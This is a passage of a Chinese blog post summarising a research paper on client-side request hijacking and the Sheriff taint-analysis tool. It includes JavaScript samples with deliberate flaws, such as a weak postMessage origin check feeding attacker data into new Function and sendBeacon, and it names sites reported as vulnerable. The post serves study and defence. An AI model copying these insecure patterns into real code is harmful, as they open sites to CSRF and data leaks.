Sockets：</strong></p><p>​<code>WebSocket</code>是一种在Web应用程序中实现双向通信的协议和<code>API</code>。它提供了一种持久化的连接，允许服务器和客户端之间进行实时的双向数据传输。<code>WebSocket</code>通过建立一条持久化的连接，避免了每次通信都需要创建新的HTTP请求的开销。一旦连接建立，服务器和客户端之间可以长时间保持连接状态，实现实时通信。</p><p>​<code>WebSocket</code>和<code>HTTP</code>的区别：大多数的Web浏览器和Web网站都是使用HTTP协议进行通信的。通过HTTP协议，客户端发送一个HTTP请求，然后服务器返回一个响应。通常来说，服务端返回一个响应后，这个HTTP请求事务就已经完成了。即使这个HTTP连接处于<code>keep-alive</code>的状态，它们之间的每一个工作(事务)依然是请求与响应，请求来了，响应回去了。这个事务就结束了。所以通常来说，HTTP协议是一个基于事务性的通信协议。</p><p>​而<code>WebSocket</code>呢，它通常是由HTTP请求发起建立的，建立连接后，会始终保持连接状态。客户端和服务端可以随时随地的通过一个<code>WebSocket</code>互发消息，没有所谓事务性的特点。这里要注意了，源于其双向全双工的通信特点，在一个<code>WebSocket</code>连接中，服务端是可以主动发送消息的哦，这一点已经完全区别于HTTP协议了。</p><p>​因此，基于以上特点，<code>WebSocket</code>通常用于低延迟和允许服务器发送消息的场景。例如，金融行业常用<code>WebSocket</code>来传输实时更新的数据</p><p>​这篇文章的研究者提出，攻击者在控制了<code>WebSocket</code>连接的情况下，可以作为中间人，连接受害者和目标服务器。</p><p>参考<a href="https://cloud.tencent.com/developer/article/1423227">利用CSWH漏洞实现用户密码重置实例</a>，没有做好CSRF防御导致的攻击。攻击手段我画了下面这张图：</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_11-28-40.png" class=""><p>​<strong>顶级导航请求(Top-Level Navigation Requests)：</strong></p><p>​前面的案例已经研究过了，浏览器的顶层API导致重定向到恶意页面。</p><p>​<strong>窗口导航请求(Window Navigation Requests)：</strong></p><p>​类似<code>location API</code>，前面已经分析过了。</p><h4 id="不同API的流行程度"><a href="#不同API的流行程度" class="headerlink" title="不同API的流行程度"></a>不同API的流行程度</h4><p>​研究者发现 9,901 个域至少包含一个与客户端请求相关的 API，在约 100 万个网页中总共有约 790 万次 API 调用。通过<code>location.href</code>的顶级导航请求最为普遍，出现在超过 8K 的网站上。通过<code>XMLHttpRequest API</code>的异步请求使用最广泛，在超过 400K 的页面上有近 300 万次调用。考虑我们提出的新漏洞变体，之前的研究工作中有超过 44.7% 的<code>API</code>调用忽略了请求劫持威胁。</p><h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>本文的研究者们开发出了一款动静态结合分析工具<code>Sheriff</code>，其主要基于4个主要部分：</p><ul><li>数据收集模块：从网页收集<code>Web</code>资源和动态污点流</li><li>数据建模模块：通过处理数据识别和建模独特的网页，并为其创建属性图</li><li>漏洞分析模块：</li><li>动态验证模块</li></ul><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_19-40-59.png" class=""><h4 id="数据收集"><a href="#数据收集" class="headerlink" title="数据收集"></a>数据收集</h4><p>本文的研究者们表示，数据收集的第一步是收集客户端的代码和运行时的参数值(比如<code>DOM</code>快照)。研究者基于<code>playwright</code>、<code>Foxhound</code>和<code>Firefox Devtools</code>开发了一个污点感知爬虫。同时由于<code>Foxhound</code>不支持所有的测试API，研究者们自己开发了支持，称为<code>Foxhound+</code>。</p><p>这个爬虫采用深度优先搜索的方式，对于一个输入，会爬取这个页面中的所有<code>URL</code>，然后爬取新<code>URL</code>中的所有<code>URL</code>，上限为200个。</p><p>在访问过程中，爬虫会收集以下信息：网页资源（例如脚本）、DOM快照、全局对象的属性、事件跟踪、网络请求和响应，以及从程序输入到安全敏感指令（例如请求）的动态污点流。</p><p>这个爬虫不会创建帐户或登录，因为手动创建和维护注册和登录脚本既脆弱又具有挑战性，特别是在处理数千个应用程序时。此限制符合大规模安全测试的最新技术，比如文章<a href="https://swag.cispa.saarland/papers/klein2022hand.pdf">S&amp;P2022</a>中也是如此。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_13-34-31.png" class=""><p><code>Playwright</code>是一个开源的自动化测试工具,用于测试网页应用。它可以操控<code>Chromium</code>(用于<code>Chrome</code>、<code>Edge</code>等)、<code>Firefox</code>和<code>WebKit</code>(用于<code>Safari</code>)等主流浏览器,使我们能在不同浏览器中执行自动化测试。<code>Playwright</code>通过直接控制浏览器引擎(如<code>Chromium</code>和<code>Firefox</code>)来执行测试,而不是通过浏览器界面。这意味着<code>Playwright</code>可以直接操控浏览器引擎,执行更快速和稳定的测试。<code>Playwright</code>使用浏览器引擎自带的<code>JavaScript</code>执行环境和<code>Web API</code>来控制浏览器。</p><p>这个脚本会打开<code>Chromium</code>浏览器,访问<code>example.com</code>网站,获取网页标题并打印,最后关闭浏览器。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> playwright.sync_api <span class="hljs-keyword">import</span> sync_playwright<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">playwright</span>):<br>    chromium = playwright.chromium<br>    browser = chromium.launch()<br>    page = browser.new_page()<br>    page.goto(<span class="hljs-string">"https://www.example.com/"</span>)<br>    title = page.title()<br>    <span class="hljs-built_in">print</span>(title)<br>    browser.close()<br><br><span class="hljs-keyword">with</span> sync_playwright() <span class="hljs-keyword">as</span> playwright:<br>    run(playwright)<br></code></pre></td></tr></table></figure><p><code>Foxhound</code>：一个在<code>Javascript</code>引擎和<code>DOM</code>中启用动态数据流跟踪的 Web 浏览器，基于<code>Mozilla Firefox</code>，它可用于识别客户端 Web 应用程序中不安全的数据流或数据隐私泄漏。</p><p><a href="https://github.com/SAP/project-foxhound">Foxhound</a></p><h4 id="数据建模"><a href="#数据建模" class="headerlink" title="数据建模"></a>数据建模</h4><p>​鉴于爬虫收集的网页数据，出于效率和可扩展性的原因，<code>Sheriff</code>会执行数据预处理。例如，<code>Sheriff</code>通过比较<code>SHA-256</code>脚本哈希值对客户端代码进行预处理，以过滤掉几乎重复的网页，这使其能够专注于具有不同<code>JavaScript</code>代码的页面，从而减少程序分析的总体工作量。同样，<code>Sheriff</code>可以执行其他类型的数据预处理，例如先前工作中使用的基于（自定义）搜索的数据过滤或代码规范化。</p><p>​删除重复的网页后，<code>Sheriff</code>创建被测客户端程序的属性图，捕获静态和动态程序行为，称为混合属性图<code>HPG</code>。 <code>Sheriff</code>使用<code>JAW</code>的扩展引擎实例化一个工作池来生成<code>HPG</code>。然后，这些<code>HPG</code>通过<code>Foxhound+</code>提供的污点流信息进行丰富，以修补由于静态分析缺陷而缺失的<code>HPG</code>边缘，最后存储在<code>Neo4j</code>图数据库中，我们可以查询该数据库进行安全测试。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_13-58-46.png" class=""><h5 id="HPG介绍"><a href="#HPG介绍" class="headerlink" title="HPG介绍"></a>HPG介绍</h5><p><code>USENIX Security Symposium</code>2021的一篇文章中提出了<code>JAW</code>框架，里面提出并详细介绍了<code>HPG</code>。</p><p><code>HPG</code>这是一种基于图的规范<code>JavaScript</code>程序模型，用于<code>JS</code>代码的分析</p><p><a href="https://www.usenix.org/system/files/sec21-khodayari.pdf">JAW: Studying Client-side CSRF with Hybrid Property Graphs and Declarative Traversals</a></p><p><code>JAW</code>，这是一个框架，可以利用混合属性图（<code>JavaScript</code>程序的规范混合模型）上的声明性遍历来针对客户端 <code>CSRF</code>分析现代<code>Web</code>应用程序。</p><p>要了解<code>HPG</code>，我觉得应该首先了解代码属性图CPG。<a href="https://zhuanlan.zhihu.com/p/395133924">参考文章</a></p><p>显然，<code>CPG</code>是一种图数据结构，它的主要思想如下：</p><ul><li><code>CPG</code>将多个程序表示(program representations)整合成一个</li><li><code>CPG</code>数据被存储在图数据库中</li><li>通过<code>DSL</code>在图数据库中遍历和查询<code>CPG</code>数据</li></ul><p>CPG 整合了 <code>AST(abstract syntax trees)</code>、<code>CFG(control flow graphs)</code>、<code>PDG(program dependence graphs)</code> 到一种数据结构当中。一个很知名的基于CPG原理的国产Java漏洞分析工具<a href="https://github.com/wh1t3p1g/tabby">Tabby</a></p><p>抽象语法树(AST)：以树的形式表现编程语言，树上的每个节点都表示源代码中的一种结构。AST一般作为源代码语法分析的重要思想，在编译原理这门课中应该会介绍。AST的应用其实是非常常见的，像是编辑器的错误提示、代码格式检查都用到了AST的原理。</p><p>程序依赖图(PDG)：处理方法是以程序的控制流图为基础，去掉CFG的控制流边，加入数据和控制流边。包括了数据依赖图和程序依赖图。数据依赖图定义了数据之间的约束关系，控制依赖图定义了语句执行情况的约束关系。程序依赖图是一个有向图。</p><p>根据下面的程序画出的图：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">int</span> x = <span class="hljs-built_in">source</span>();<br>    <span class="hljs-keyword">if</span> (x &lt; MAX)<br>    {<br>        <span class="hljs-type">int</span> y = <span class="hljs-number">2</span>*x;<br>        <span class="hljs-built_in">sink</span>(y);<br>    }<br>}<br></code></pre></td></tr></table></figure><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_21-22-48.png" class=""><p>三者合一成为<code>CPG</code>:</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_21-23-45.png" class=""><p>下面我们可以详细讨论文章中提出的<code>HPG</code>：这是论文中存在CSRF攻击的样例代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JS"><span class="hljs-keyword">var</span> i = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'输入'</span>);<br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">h</span>(<span class="hljs-params">e</span>){ <br>    <span class="hljs-keyword">var</span> uri = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substr</span>(<span class="hljs-number">1</span>) ;<br>    <span class="hljs-keyword">if</span> ( uri.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) { <br>        <span class="hljs-keyword">let</span> req = <span class="hljs-keyword">new</span> asyncRequest (<span class="hljs-string">" POST "</span> , uri ); <br>        <span class="hljs-comment">// 添加同步器令牌 </span><br>        req.<span class="hljs-title function_">initHeader</span>(<span class="hljs-string">'X-CSRF-TOKEN'</span>, token); <br>        <span class="hljs-keyword">var</span> 价格 = wait req.<span class="hljs-property">send</span> () ; <span class="hljs-number">9</span> i.<span class="hljs-property">value</span> = 价格;<br>    }<br>} <br>i.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'loadInvoice'</span>, h); <br>... <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">showInvoicePrice</span> ( input_id ) { <br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(input_id).<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'loadInvoice'</span>, {}));<br>}<br><span class="hljs-title function_">showInvoicePrice</span>(<span class="hljs-string">'input'</span>);<br></code></pre></td></tr></table></figure><p>原文中的<code>HPG</code>图：说实话，根本没有看懂哈哈哈哈。先放在这里吧。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_22-40-34.png" class=""><p>​那么基于<code>CPG</code>的思想，<code>HPG</code>就是在<code>JavaScript</code>代码上的一个特化。简单来说，<code>HPG</code>是一种基于图的规范<code>JavaScript</code>程序模型，用于<code>JS</code>代码的分析。反正最后我们知道，<code>HPG</code>是客户端 <code>JavaScript</code>程序的统一表示，<strong>它将静态代码表示和运行时状态值集成到基于图形的结构中</strong>。</p><p>​状态值是在执行过程中观察到的具体程序值，例如<code>Web</code>存储值和<code>cookie</code>。<code>HPG</code>集成了多种静态代码表示，即抽象语法树 (AST)、控制流图 (CFG)、调用图 (CG)、程序依赖图 (PDG) 以及事件注册、调度和依赖图 (ERDDG)，它们分别捕捉程序的语法嵌套、执行顺序、函数调用关系、数据流和控制依赖性以及事件驱动的控制传输。<code>HPG</code>还包含语义类型，它们是分配给节点（例如接收器和源）的标签，用于捕获指令的语义含义。<code>HPG</code>编码为有向图，采用标记属性图结构，其中节点和边拥有标签和键值属性。</p><p>​总之就是基于<code>HPG</code>，我们可以便捷地分析<code>JavaScript</code>的代码片段。</p><h5 id="改进：Taintflow-Augmented-TA-HPGs"><a href="#改进：Taintflow-Augmented-TA-HPGs" class="headerlink" title="改进：Taintflow-Augmented (TA) HPGs"></a>改进：Taintflow-Augmented (TA) HPGs</h5><p>​研究者们制定了<code>HPG</code>上的请求劫持漏洞检测任务，打算识别在页面加载时触发的请求发送指令，因为这些指令容易被攻击者通过程序输入操纵。</p><p>​不幸的是，由于客户端<code>JavaScript</code>程序的动态特性，执行此类过程间可达性和数据流分析任务并非易事。虽然<code>HPG</code>状态值（即环境属性和事件跟踪）通过对具体对象快照（例如，指向分析和触发的分析）进行推理，有助于减轻许多<code> JavaScript</code>静态分析缺点（例如，不精确的控制和数据流依赖性事件处理程序），但也不足以识别图中许多其他丢失的调用和数据流连接。</p><p>​在本文中，<strong>研究者使用成熟的浏览器内动态污点跟踪，通过向节点添加补充边和标签（例如，标记可达性、语义类型和运行时变量值）来进一步增强HPG，从而重建缺失连接使得其在页面加载时可以访问，否则静态分析会错过这些</strong>。</p><p>​我们使用<code>Foxhound+</code>收集从输入源到所有接收器类型的动态污点流，包括那些不是请求发送指令的指令，以便补充<code>HPG</code>中尽可能多的可能缺失元素。</p><p>​具体来说，首先从<code>Foxhound+</code>中提取动态调用图和数据流图，并将它们分别与静态调用图和<code>PDG</code>合并。为了进行动态和静态图之间的匹配以进行合并，我们首先通过比较两个模型中的脚本哈希来确定指令或节点位于哪个脚本文件中，然后使用代码行来确定顶层（即<code>CFG</code>）该指令的<code>HPG</code>中的节点。</p><p>​将动态数据流图与<code>PDG</code>合并时，如果缺少边，我们将创建数据依赖边，标签是传播其数据的污点流中报告的变量名称。相反，如果两个节点之间已经存在<code>PDG</code>边，我们会向该边添加一个标签，标记传播变量的运行时值。</p><p>​类似地，当合并两个调用图时，如果缺少一条新边，我们将创建一条新边，并用调用的函数和参数名称以及函数调用的具体参数值对其进行标记。然而，当<code>HPG</code>中存在调用边缘时，我们只能通过添加调用站点参数的运行时值来丰富其信息。</p><p>​最后，我们为所有源节点和接收节点添加标签作为语义类型，捕获这些指令的语义，例如，为读取<code>document.URI</code>值的指令设置类型<code>RD_DOC_URL</code>，然后在计算后传播到其他<code>HPG</code>节点的程序。</p><p>​为了增强<code>JAW</code>的<code>HPG</code>生成，我们做了一些修改，解决了<code>ES6</code>支持不完整的问题，以改进控制传输建模和数据流分析。例如，我们使用<code>Promise</code>对象和<code>setTimeout()</code>回调添加了对异步操作的支持，提高了调用图和<code>PDG</code>边的精度。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_16-07-21.png" class=""><p>​此外，我们应用了多种优化来提高可扩展性，例如处理<code>PDG</code>构建期间迭代构造的低效率问题，以及通过使用<code>ineo</code>创建协调器来并行管理<code>Neo4j</code>图形数据库。总体而言，这些修改解决了 <code>JAW</code>的几个缺点，使<code>HPG</code>的构建能够进行更精确的分析并提高了可扩展性。</p><p>​下方右侧的图显示了 Sheriff 为下方左侧中的代码生成的 TA-HPG，它增加了由于动态函数调用而丢失的 HPG 边缘。特别关注的是，Sheriff 使用 Foxhound+ 提供的动态污点流添加第 26 行中的调用表达式节点和第 17 行中的函数声明节点之间的调用边，以及 (ii) 从第 13 行中的赋值表达式到第 26 行中的调用表达式节点用于调用参数 u 和 d。</p><pre><code class="hljs"> 因此，TA-HPG 遍历现在可以从 L12 中的源节点开始，经过 L13、L26 和 L17 节点，最后到达接收器指令，该接收器指令拾取攻击者控制的值。</code></pre><p>实例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> c = {}, i = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// handle incoming postMessages</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"message"</span>, h); <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">h</span>(<span class="hljs-params">e</span>){ <br>    <span class="hljs-keyword">if</span>(e.<span class="hljs-property">origin</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">"bbc.com"</span>) &gt; -<span class="hljs-number">1</span>){ <br>        i = i + <span class="hljs-number">1</span>; <br>    <span class="hljs-comment">// [...] </span><br>        <span class="hljs-keyword">var</span> d = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({<br>            <span class="hljs-string">"csrf_token"</span>: <span class="hljs-string">"xyz-token"</span>,<br>            <span class="hljs-string">"state"</span>: {...}, <span class="hljs-number">11</span> });<br>            <span class="hljs-keyword">var</span> u = e.<span class="hljs-property">data</span> + <span class="hljs-string">'/userinfo'</span>;<br>            c[<span class="hljs-string">"r"</span> + i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">"httpPostRequest("</span>+ u + <span class="hljs-string">","</span> + d + <span class="hljs-string">")"</span>);<br>    }<br>}<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">httpPostRequest</span>(<span class="hljs-params">url, body</span>){ <br>    <span class="hljs-comment">// [...]</span><br>    navigator.<span class="hljs-title function_">sendBeacon</span>(url, body) <br>}<br><span class="hljs-comment">// remember state upon closing the session </span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"visibilitychange"</span>, saveState);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">saveState</span>(<span class="hljs-params">e</span>) { <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">visibilityState</span> === <span class="hljs-string">"hidden"</span>) { <br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> j=<span class="hljs-number">1</span>; j&lt;= i; j++){<br>            c[<span class="hljs-string">"r"</span> + j](); <br>        } <br>    }<br>}<br></code></pre></td></tr></table></figure><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_15-06-35.png" class=""><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​将客户端代码建模为<code>TA-HPG</code>后，<strong>研究者将检测请求劫持漏洞的任务定义为图遍历问题</strong>。具体来说，假设攻击者已经控制了某些指令的参数输入，现在搜索出页面加载时发送敏感请求的程序指令。</p><p>​第一步，识别读取攻击者控制的输入的<code>TA-HPG</code>源，并为它们分配一个与<code>JAW</code>类似的相关语义类型，例如，我们为读取的指令设置一个名为 <code>RD_WIN_LOC</code>的标签通过<code>window.location API</code>获取<code>URL</code>。然后，给定用于发送请求的浏览器<code>API</code>列表，Sheriff 搜索<code>TA-HPG</code>以识别使用这些<code>API</code>的节点，并通过为它们分配相关的语义类型将它们标记为接收器，例如，标签 <code>WR_ASYNC_REQ_URL</code>是为写入异步请求的<code>URL</code>的指令设置的，例如<code>XMLHttpRequest.open()</code>。</p><p>​最后，为了发现易受攻击的路径，<code>Sheriff</code>通过在<code>PDG</code>、<code>CFG</code>、<code>CG</code>和<code>ERDDG</code>边上将语义类型从源传播到接收器来执行数据流分析，其中具有接收器语义类型的节点被源类型污染，并且获取攻击者控制的值。</p><p>​然后执行可达性分析，以检查易受攻击的路径是否可能对应于页面加载时执行的代码行。为此，它从污染源节点和sink node(污染数据的关键中转调用点)开始，向后跟踪 <code>CFG</code>、<code>ERDDG</code>和<code>CG</code>边，直到到达<code>CFG</code>入口节点或不再存在与回溯条件匹配的边，并选择污染源节点和sink node都存在的数据流。那么此接收器是可到达的节点。最终，该组件输出一组具有从源到请求接收器的潜在数据流的路径。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-20_01-01-49.png" class=""><h3 id="漏洞验证方法"><a href="#漏洞验证方法" class="headerlink" title="漏洞验证方法"></a>漏洞验证方法</h3><p>​研究者通过<code>Playwright</code>和<code>Chrome DevTools Protocol</code>来执行运行时监控，检测了负责发送请求的浏览器 <code>API</code>并拦截页面加载时发生的网络消息。为了最大限度地规避造成实际危害，验证模块检测请求<code>API</code>仅记录请求参数，而不实际向服务器端发送任何请求。对于每个实时页面，会首先比较其与数据集里的哈希值。如果相同的话，选择实时运行的页面进行监控。这样做是为了保证使用的是收集时的页面。</p><p>​然后，对于每个请求劫持数据流，我们向相应的源输入一个无害的<code>token</code>，在由<code>Playwright</code>控制的检测浏览器中加载网页，并在客户端请求中搜索这个<code>token</code>以检查是否观察到了被操纵的输入。由于<code>DOM</code>环境不同，即使相同的页面，可能会有不同的执行结果，所有接近重复的页面也会测试每个候选数据流。</p><h3 id="实证评估"><a href="#实证评估" class="headerlink" title="实证评估"></a>实证评估</h3><p>​表 3 总结了数据收集和建模步骤的结果。从 10K 种子 URL 开始，<code>Sheriff</code>在所有网站上总共获得了约1M个网页。每个网站的平均为103个页面。这些 100 万个页面包含大约 4610 万个脚本。页面重复数据删除将数据集的大小减少了约17%。也就是说，在总共 100 万个网页中，有 867,455个页面是唯一的</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-20_22-25-11.png" class=""><p>​考虑到原始数据的庞大规模以及分析数十万个网页的需要，研究者通过将测试工作集中在每个网站中动态污点流频率最高的前 50 个页面上，进一步缩小了测试床的大小（源自输入源并到达请求发送接收器），这是基于这些页面包含漏洞的概率较高。总之，867K 个唯一页面包含约 720 万个动态污点流，这些流向请求发送接收器，我们将其用于页面选择。因此，867K 网页被过滤为 339,267 个页面。其中，Sheriff 提取了 11,544,754 个脚本和 21.6M动态污点流，用它们来丰富 HPG，以修复静态分析未发现的缺失连接。在这 2160 万个污点流中，有 3,318,747 个流包含请求发送接收器，这可以表明存在请求劫持漏洞。 Sheriff 总共平均处理 34 个脚本和每页 95K LoC，生成 339,267 个 TA-HPG。</p><p>​<strong>在可被劫持的各种类型的请求中，异步请求最为普遍 (85%)，在 905 个站点中有超过 172K 个实例。有趣的是，窗口导航请求(Window Navigation Requests)是第二常见的（8.2%），占 365 个站点。在另一个极端，被劫持的推送请求和 EventSource 发生的频率最低，分别仅影响 25 个和 3 个站点的约 0.3% 的请求流。最后，被劫持的 WebSocket劫持和顶级请求(Top-level Request)表现出中等程度的流行程度，相当于总共约 6% 的易受攻击的数据流。</strong></p><p>​新漏洞类型和变体构成了请求劫持的很大一部分（即 36.1%）。首先，新漏洞类型占已发现案例总数 23.6 万个的 14.2%（35,159 个）以上。其中，Sheriff 验证了 10,925 个网页和 439 个站点的 28,827 个易受攻击的数据流，突显了新漏洞的广泛存在。然后，21.9% 的请求劫持是我们考虑使用新浏览器 API 的新变体。</p><p>​发现的劫持造成的危害中最常见的是客户端 CSRF，其中 96% 的漏洞（即 196K）可以被滥用。然而，48.5% 的可劫持请求也可能被滥用进行信息泄露，因为攻击者可以控制请求发送到的端点，从而窃取请求正文中包含的敏感信息，例如 CSRF 令牌、PII、推送端点和加密密钥。最不常见的后果是推送订阅上的持续 DoS，占漏洞总数的 0.2%。其他常见后果是客户端 XSS 和开放重定向，总共影响 10.1% 的页面。最后，4.2%的漏洞可能导致WebSocket和EventSource的跨站点连接劫持。</p><p>​通过修补漏洞检测所需的缺失 HPG 边缘（即混合数据流路径），帮助静态分析识别 17.9K 额外数据流。然而，表 3 强调了纯动态分析的一个关键挑战：报告的污点流规模很大，其中大部分不受攻击者控制（参见表 10）。相反，静态分析能够检测到 66.2K 数据流。因此，动态和静态分析的结合可能是有利的。动态分析通过补充 HPG 边缘（例如调用图）来增强静态分析，而静态分析有助于消除攻击者无法控制的虚假污点流（例如由于输入验证）。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-20_22-48-43.png" class=""><p>​表 6 总结了在调查过程中发现的攻击。我们总共在 49 个网站上创建了 67 个概念验证漏洞，产生了深远的影响，例如 CSRF、客户端 XSS、开放重定向以及跨各种流行平台和功能的敏感信息泄漏。值得注意的是，我们发现了 Starz 电影流服务中的帐户接管漏洞、Microsoft Azure 中的用户 VM 删除、Google DoubleClick 和 VK 中的任意重定向、DW 和 BBC 中的帐户设置操纵、Indeed 中的工作申请篡改、通过 WebSocket 的数据泄露JustWatch 和 Forbes 中的 EventSource 劫持、Reddit 中 PushManager 订阅的 CSRF、Yoox 购物网站中推送通知的持久客户端 DoS，以及 TP-Link 中的客户端 XSS，仅举几个例子。其中，24 个站点的总共 33 个漏洞属于我们工作中提出的新漏洞类型。我们建议感兴趣的读者参阅§A.2，了解已确认攻击的案例研究。</p><h3 id="防御策略评估"><a href="#防御策略评估" class="headerlink" title="防御策略评估"></a>防御策略评估</h3><p>​本节讨论 RQ3，我们在其中审查和评估针对客户端请求劫持漏洞的现有对策的采用情况和有效性。我们系统地调查了学术文献、W3C 规范和 OWASP CheatSheet Series，寻找经典的反 CSRF 对策和那些可以减轻客户端请求劫持的防御措施。总的来说，研究者确定了 10 种不同的请求伪造防御措施，并根据执行方（即 Web 应用程序或浏览器）将其分为两大类。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_20-45-26.png" class=""><p>​我们的分析发现，约 47% 的易受攻击的数据流没有任何输入验证检查，这表明开发人员很大程度上没有意识到与控制客户端请求相关的风险。</p><p>​<code>window.open()</code>在新窗口中打开易受攻击的目标页面，<code>COOP</code>可用于将浏览上下文与同源文档隔离。例如，如果在新窗口中打开一个诚实的、带有<code>COOP</code>的跨域页面，则恶意打开的页面将不会引用它，从而阻止攻击者设置窗口名称，或向新窗口发送<code>postMessages</code>，这在<code>turn</code>可以防止伪造这些输入生成的请求。我们发现大约 7% 的请求劫持数据流可以通过<code>COOP</code>缓解，因为它们依赖于窗口名称、文档引用者和<code>postMessages</code>来提供程序输入。然而，我们观察到，只有 ∼1.9% 的网页实施了<code>COOP</code>，而且令人惊讶的是，没有一个表现出请求劫持数据流的网页采用了这一政策，这呼吁人们提高对<code>COOP</code>的认识。</p><p>累了😥</p>]]></content>
    
    
    <categories>
      
      <category>论文阅读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>论文阅读</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Anaconda安装与使用</title>
    <link href="/2024/01/26/Anaconda%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/01/26/Anaconda%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
